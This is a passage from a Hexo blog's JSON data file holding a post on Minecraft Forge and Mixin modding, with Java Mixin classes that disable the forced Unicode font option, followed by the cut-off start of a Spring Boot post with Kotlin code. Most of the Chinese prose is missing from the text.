\n\n\n\n\n\n~~~java\npackage me.skymc.fsb.mixin;\n\nimport net.minecraft.client.AbstractOption;\nimport net.minecraft.client.gui.screen.Screen;\nimport net.minecraft.client.gui.widget.Widget;\nimport net.minecraft.client.gui.widget.button.OptionButton;\nimport org.spongepowered.asm.mixin.Mixin;\nimport org.spongepowered.asm.mixin.injection.At;\nimport org.spongepowered.asm.mixin.injection.Inject;\nimport org.spongepowered.asm.mixin.injection.callback.CallbackInfoReturnable;\n\n/**\n * FSB\n * me.skymc.fsb.mixin.MixinScreenLanguage\n *\n * @author \n * @since 2021/12/29 10:54 PM\n */\n@Mixin(Screen.class)\npublic abstract class MixinLanguageScreen {\n\n    @Inject(method = \"addButton\", at = @At(value = \"HEAD\"), cancellable = true)\n    protected <T extends Widget> void addButton(T p_230480_1_, CallbackInfoReturnable<T> c) {\n        if (p_230480_1_ instanceof OptionButton && ((OptionButton) p_230480_1_).getOption() == AbstractOption.FORCE_UNICODE_FONT) {\n            c.setReturnValue(p_230480_1_);\n        }\n    }\n}\n~~~","slug":"hello-forge-and-mixin","published":1,"updated":"2022-11-24T02:59:14.239Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jth0016sfklgu2uh9hd","content":"<h1 id=\"Hello-Minecraft-Forge-amp-Mixin\"><a href=\"#Hello-Minecraft-Forge-amp-Mixin\" class=\"headerlink\" title=\"Hello Minecraft Forge &amp; Mixin!\"></a>Hello Minecraft Forge &amp; Mixin!</h1><blockquote>\n<p> Unicode </p>\n<p>Forge</p>\n</blockquote>\n<h2 id=\"Forge\"><a href=\"#Forge\" class=\"headerlink\" title=\"Forge\"></a>Forge</h2><blockquote>\n<p>Forge ModBukkit</p>\n<p> 1.121.16forge</p>\n<p></p>\n<p>Bukkitforge mod</p>\n</blockquote>\n<p>forgeForgeGradle mdkgradle</p>\n<p>mcbbs[<a href=\"https://www.mcbbs.net/thread-896542-1-1.html\">1.17.1-1.7.10] Minecraft [Forge|Fabric] -  - Minecraft() - (mcbbs.net)</a>gradle</p>\n<p>Forge</p>\n<p></p>\n<p></p>\n<h2 id=\"Mixin\"><a href=\"#Mixin\" class=\"headerlink\" title=\"Mixin\"></a>Mixin</h2><blockquote>\n<p>MixinSpongePoweredjavaagentasmMixinMinecraft</p>\n<p>Bukkit APIBukkit API</p>\n<p>Forge APIForgeAPI</p>\n<p>ForgeMixinForge1.16ForgeMixin</p>\n<p>MojangMinecraftMinecraftMinecraft</p>\n<p>Forge</p>\n<p>MixinBukkit</p>\n<p>Mixin</p>\n</blockquote>\n<p>MixinMixin</p>\n<p>Mixin[<a href=\"https://www.mcbbs.net/thread-833646-1-1.html\">][]MixinMinecraft -  - Minecraft() - (mcbbs.net)</a></p>\n<p>Mixin</p>\n<p>1.16Forge Mod</p>\n<p>release note</p>\n<p><a href=\"https://izzel.io/2020/02/06/mixin-0-8-guide/\"> Mixin  0.8  ModLauncher  | IzzelAlizs Blog</a></p>\n<p><a href=\"https://github.com/SpongePowered/Mixin/wiki/Release-Notes---Mixin-0.8\">Release Notes Mixin 0.8  SpongePowered/Mixin Wiki (github.com)</a></p>\n<p>Mixin</p>\n<blockquote>\n<p></p>\n<p>1.MixinConnector</p>\n<p>2.MixinRefmap</p>\n<p>3.MixinAnnoationProcessor</p>\n<p>4.Mixin</p>\n<p>MixinMixin Pakage</p>\n</blockquote>\n<p></p>\n<p><a href=\"https://github.com/mouse0w0/forge-mixin-example\">mouse0w0/forge-mixin-example: An example for using Mixin in Minecraft Forge 1.12.2 (github.com)</a></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p></p>\n<p>Mixin</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>booleanUnicode</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">\n<span class=\"token keyword\">package</span> <span class=\"token namespace\">me<span class=\"token punctuation\">.</span>asgard<span class=\"token punctuation\">.</span>rain<span class=\"token punctuation\">.</span>afu<span class=\"token punctuation\">.</span>mixin</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>google<span class=\"token punctuation\">.</span>common<span class=\"token punctuation\">.</span>collect<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ImmutableMap</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">net<span class=\"token punctuation\">.</span>minecraft<span class=\"token punctuation\">.</span>client<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Minecraft</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">net<span class=\"token punctuation\">.</span>minecraft<span class=\"token punctuation\">.</span>client<span class=\"token punctuation\">.</span>gui<span class=\"token punctuation\">.</span>fonts<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">FontResourceManager</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>spongepowered<span class=\"token punctuation\">.</span>asm<span class=\"token punctuation\">.</span>mixin<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Final</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>spongepowered<span class=\"token punctuation\">.</span>asm<span class=\"token punctuation\">.</span>mixin<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Mixin</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>spongepowered<span class=\"token punctuation\">.</span>asm<span class=\"token punctuation\">.</span>mixin<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Overwrite</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>spongepowered<span class=\"token punctuation\">.</span>asm<span class=\"token punctuation\">.</span>mixin<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Shadow</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">IOException</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">/**\n * me.asgard.rain.afu.GameSettingMixin\n * AntiForceUnicode\n *\n * @author \n * @since 2021/12/29 13:48\n **/</span>\n<span class=\"token annotation punctuation\">@Mixin</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Minecraft</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">abstract</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">MinecraftMixin</span> <span class=\"token punctuation\">{</span>\n\n    <span class=\"token annotation punctuation\">@Final</span>\n    <span class=\"token annotation punctuation\">@Shadow</span>\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">FontResourceManager</span> fontManager<span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/**\n     * @author Rain\n     * @reason force disable force unicode\n     */</span>\n    <span class=\"token annotation punctuation\">@Overwrite</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">boolean</span> <span class=\"token function\">isEnforceUnicode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">/**\n     * @author Rain\n     * @reason force disable force unicode\n     */</span>\n    <span class=\"token annotation punctuation\">@Overwrite</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">selectMainFont</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">boolean</span> p_238209_1_<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        fontManager<span class=\"token punctuation\">.</span><span class=\"token function\">setRenames</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ImmutableMap</span><span class=\"token punctuation\">.</span><span class=\"token function\">of</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p></p>\n<p></p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">package</span> <span class=\"token namespace\">me<span class=\"token punctuation\">.</span>skymc<span class=\"token punctuation\">.</span>fsb<span class=\"token punctuation\">.</span>mixin</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">net<span class=\"token punctuation\">.</span>minecraft<span class=\"token punctuation\">.</span>client<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">AbstractOption</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">net<span class=\"token punctuation\">.</span>minecraft<span class=\"token punctuation\">.</span>client<span class=\"token punctuation\">.</span>gui<span class=\"token punctuation\">.</span>screen<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Screen</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">net<span class=\"token punctuation\">.</span>minecraft<span class=\"token punctuation\">.</span>client<span class=\"token punctuation\">.</span>gui<span class=\"token punctuation\">.</span>widget<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Widget</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">net<span class=\"token punctuation\">.</span>minecraft<span class=\"token punctuation\">.</span>client<span class=\"token punctuation\">.</span>gui<span class=\"token punctuation\">.</span>widget<span class=\"token punctuation\">.</span>button<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">OptionButton</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>spongepowered<span class=\"token punctuation\">.</span>asm<span class=\"token punctuation\">.</span>mixin<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Mixin</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>spongepowered<span class=\"token punctuation\">.</span>asm<span class=\"token punctuation\">.</span>mixin<span class=\"token punctuation\">.</span>injection<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">At</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>spongepowered<span class=\"token punctuation\">.</span>asm<span class=\"token punctuation\">.</span>mixin<span class=\"token punctuation\">.</span>injection<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Inject</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>spongepowered<span class=\"token punctuation\">.</span>asm<span class=\"token punctuation\">.</span>mixin<span class=\"token punctuation\">.</span>injection<span class=\"token punctuation\">.</span>callback<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">CallbackInfoReturnable</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">/**\n * FSB\n * me.skymc.fsb.mixin.MixinScreenLanguage\n *\n * @author \n * @since 2021/12/29 10:54 PM\n */</span>\n<span class=\"token annotation punctuation\">@Mixin</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Screen</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">abstract</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">MixinLanguageScreen</span> <span class=\"token punctuation\">{</span>\n\n    <span class=\"token annotation punctuation\">@Inject</span><span class=\"token punctuation\">(</span>method <span class=\"token operator\">=</span> <span class=\"token string\">\"addButton\"</span><span class=\"token punctuation\">,</span> at <span class=\"token operator\">=</span> <span class=\"token annotation punctuation\">@At</span><span class=\"token punctuation\">(</span>value <span class=\"token operator\">=</span> <span class=\"token string\">\"HEAD\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> cancellable <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">T</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Widget</span><span class=\"token punctuation\">&gt;</span></span> <span class=\"token keyword\">void</span> <span class=\"token function\">addButton</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">T</span> p_230480_1_<span class=\"token punctuation\">,</span> <span class=\"token class-name\">CallbackInfoReturnable</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">&gt;</span></span> c<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>p_230480_1_ <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">OptionButton</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">OptionButton</span><span class=\"token punctuation\">)</span> p_230480_1_<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getOption</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token class-name\">AbstractOption</span><span class=\"token punctuation\">.</span>FORCE_UNICODE_FONT<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            c<span class=\"token punctuation\">.</span><span class=\"token function\">setReturnValue</span><span class=\"token punctuation\">(</span>p_230480_1_<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":""},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go","url":"https://blog.stellaris.wang/","title":""}]}},"excerpt":"","more":"<h1 id=\"Hello-Minecraft-Forge-amp-Mixin\"><a href=\"#Hello-Minecraft-Forge-amp-Mixin\" class=\"headerlink\" title=\"Hello Minecraft Forge &amp; Mixin!\"></a>Hello Minecraft Forge &amp; Mixin!</h1><blockquote>\n<p> Unicode </p>\n<p>Forge</p>\n</blockquote>\n<h2 id=\"Forge\"><a href=\"#Forge\" class=\"headerlink\" title=\"Forge\"></a>Forge</h2><blockquote>\n<p>Forge ModBukkit</p>\n<p> 1.121.16forge</p>\n<p></p>\n<p>Bukkitforge mod</p>\n</blockquote>\n<p>forgeForgeGradle mdkgradle</p>\n<p>mcbbs[<a href=\"https://www.mcbbs.net/thread-896542-1-1.html\">1.17.1-1.7.10] Minecraft [Forge|Fabric] -  - Minecraft() - (mcbbs.net)</a>gradle</p>\n<p>Forge</p>\n<p></p>\n<p></p>\n<h2 id=\"Mixin\"><a href=\"#Mixin\" class=\"headerlink\" title=\"Mixin\"></a>Mixin</h2><blockquote>\n<p>MixinSpongePoweredjavaagentasmMixinMinecraft</p>\n<p>Bukkit APIBukkit API</p>\n<p>Forge APIForgeAPI</p>\n<p>ForgeMixinForge1.16ForgeMixin</p>\n<p>MojangMinecraftMinecraftMinecraft</p>\n<p>Forge</p>\n<p>MixinBukkit</p>\n<p>Mixin</p>\n</blockquote>\n<p>MixinMixin</p>\n<p>Mixin[<a href=\"https://www.mcbbs.net/thread-833646-1-1.html\">][]MixinMinecraft -  - Minecraft() - (mcbbs.net)</a></p>\n<p>Mixin</p>\n<p>1.16Forge Mod</p>\n<p>release note</p>\n<p><a href=\"https://izzel.io/2020/02/06/mixin-0-8-guide/\"> Mixin  0.8  ModLauncher  | IzzelAlizs Blog</a></p>\n<p><a href=\"https://github.com/SpongePowered/Mixin/wiki/Release-Notes---Mixin-0.8\">Release Notes Mixin 0.8  SpongePowered&#x2F;Mixin Wiki (github.com)</a></p>\n<p>Mixin</p>\n<blockquote>\n<p></p>\n<p>1.MixinConnector</p>\n<p>2.MixinRefmap</p>\n<p>3.MixinAnnoationProcessor</p>\n<p>4.Mixin</p>\n<p>MixinMixin Pakage</p>\n</blockquote>\n<p></p>\n<p><a href=\"https://github.com/mouse0w0/forge-mixin-example\">mouse0w0&#x2F;forge-mixin-example: An example for using Mixin in Minecraft Forge 1.12.2 (github.com)</a></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p></p>\n<p>Mixin</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>booleanUnicode</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">\n<span class=\"token keyword\">package</span> <span class=\"token namespace\">me<span class=\"token punctuation\">.</span>asgard<span class=\"token punctuation\">.</span>rain<span class=\"token punctuation\">.</span>afu<span class=\"token punctuation\">.</span>mixin</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>google<span class=\"token punctuation\">.</span>common<span class=\"token punctuation\">.</span>collect<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ImmutableMap</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">net<span class=\"token punctuation\">.</span>minecraft<span class=\"token punctuation\">.</span>client<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Minecraft</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">net<span class=\"token punctuation\">.</span>minecraft<span class=\"token punctuation\">.</span>client<span class=\"token punctuation\">.</span>gui<span class=\"token punctuation\">.</span>fonts<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">FontResourceManager</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>spongepowered<span class=\"token punctuation\">.</span>asm<span class=\"token punctuation\">.</span>mixin<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Final</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>spongepowered<span class=\"token punctuation\">.</span>asm<span class=\"token punctuation\">.</span>mixin<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Mixin</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>spongepowered<span class=\"token punctuation\">.</span>asm<span class=\"token punctuation\">.</span>mixin<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Overwrite</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>spongepowered<span class=\"token punctuation\">.</span>asm<span class=\"token punctuation\">.</span>mixin<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Shadow</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">IOException</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">/**\n * me.asgard.rain.afu.GameSettingMixin\n * AntiForceUnicode\n *\n * @author \n * @since 2021/12/29 13:48\n **/</span>\n<span class=\"token annotation punctuation\">@Mixin</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Minecraft</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">abstract</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">MinecraftMixin</span> <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token annotation punctuation\">@Final</span>\n    <span class=\"token annotation punctuation\">@Shadow</span>\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">FontResourceManager</span> fontManager<span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/**\n     * @author Rain\n     * @reason force disable force unicode\n     */</span>\n    <span class=\"token annotation punctuation\">@Overwrite</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">boolean</span> <span class=\"token function\">isEnforceUnicode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @author Rain\n     * @reason force disable force unicode\n     */</span>\n    <span class=\"token annotation punctuation\">@Overwrite</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">selectMainFont</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">boolean</span> p_238209_1_<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        fontManager<span class=\"token punctuation\">.</span><span class=\"token function\">setRenames</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ImmutableMap</span><span class=\"token punctuation\">.</span><span class=\"token function\">of</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p></p>\n<p></p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">package</span> <span class=\"token namespace\">me<span class=\"token punctuation\">.</span>skymc<span class=\"token punctuation\">.</span>fsb<span class=\"token punctuation\">.</span>mixin</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">net<span class=\"token punctuation\">.</span>minecraft<span class=\"token punctuation\">.</span>client<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">AbstractOption</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">net<span class=\"token punctuation\">.</span>minecraft<span class=\"token punctuation\">.</span>client<span class=\"token punctuation\">.</span>gui<span class=\"token punctuation\">.</span>screen<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Screen</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">net<span class=\"token punctuation\">.</span>minecraft<span class=\"token punctuation\">.</span>client<span class=\"token punctuation\">.</span>gui<span class=\"token punctuation\">.</span>widget<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Widget</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">net<span class=\"token punctuation\">.</span>minecraft<span class=\"token punctuation\">.</span>client<span class=\"token punctuation\">.</span>gui<span class=\"token punctuation\">.</span>widget<span class=\"token punctuation\">.</span>button<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">OptionButton</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>spongepowered<span class=\"token punctuation\">.</span>asm<span class=\"token punctuation\">.</span>mixin<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Mixin</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>spongepowered<span class=\"token punctuation\">.</span>asm<span class=\"token punctuation\">.</span>mixin<span class=\"token punctuation\">.</span>injection<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">At</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>spongepowered<span class=\"token punctuation\">.</span>asm<span class=\"token punctuation\">.</span>mixin<span class=\"token punctuation\">.</span>injection<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Inject</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>spongepowered<span class=\"token punctuation\">.</span>asm<span class=\"token punctuation\">.</span>mixin<span class=\"token punctuation\">.</span>injection<span class=\"token punctuation\">.</span>callback<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">CallbackInfoReturnable</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">/**\n * FSB\n * me.skymc.fsb.mixin.MixinScreenLanguage\n *\n * @author \n * @since 2021/12/29 10:54 PM\n */</span>\n<span class=\"token annotation punctuation\">@Mixin</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Screen</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">abstract</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">MixinLanguageScreen</span> <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token annotation punctuation\">@Inject</span><span class=\"token punctuation\">(</span>method <span class=\"token operator\">=</span> <span class=\"token string\">\"addButton\"</span><span class=\"token punctuation\">,</span> at <span class=\"token operator\">=</span> <span class=\"token annotation punctuation\">@At</span><span class=\"token punctuation\">(</span>value <span class=\"token operator\">=</span> <span class=\"token string\">\"HEAD\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> cancellable <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">T</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Widget</span><span class=\"token punctuation\">></span></span> <span class=\"token keyword\">void</span> <span class=\"token function\">addButton</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">T</span> p_230480_1_<span class=\"token punctuation\">,</span> <span class=\"token class-name\">CallbackInfoReturnable</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">></span></span> c<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>p_230480_1_ <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">OptionButton</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">OptionButton</span><span class=\"token punctuation\">)</span> p_230480_1_<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getOption</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token class-name\">AbstractOption</span><span class=\"token punctuation\">.</span>FORCE_UNICODE_FONT<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            c<span class=\"token punctuation\">.</span><span class=\"token function\">setReturnValue</span><span class=\"token punctuation\">(</span>p_230480_1_<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>"},{"title":"Hello Spring Boot!","date":"2021-12-24T16:00:00.000Z","author":"","hide":false,"summary":"spring boot","_content":"\n# Hello Spring Boot\n\nGoNode.js\n\nSpring BootKotlinGradle\n\nSpring Bootjava\n\njsonapi\n\n~~~kotlin\n@RestController\nclass TestController {\n\n    @GetMapping(\"/greeting\")\n    fun greeting(@RequestParam(value = \"name\", defaultValue = \"World\") name: String) = BaseResponseBean(\"Hello $name\")\n\n}\n\ndata class BaseResponseBean<T>(\n    val data: T?,\n    val errorCode: Int = 0,\n    val errorMsg: String = \"\"\n)\n~~~\n\nTypeScriptSpring Boot\n\n\n\n~~~kotlin\ndata class ChatWsMessageBean(\n    val type: String,\n    val username: String,\n    val data: String?,\n    val avatar: String\n)\n\nobject WebSocketMessageType {\n    const 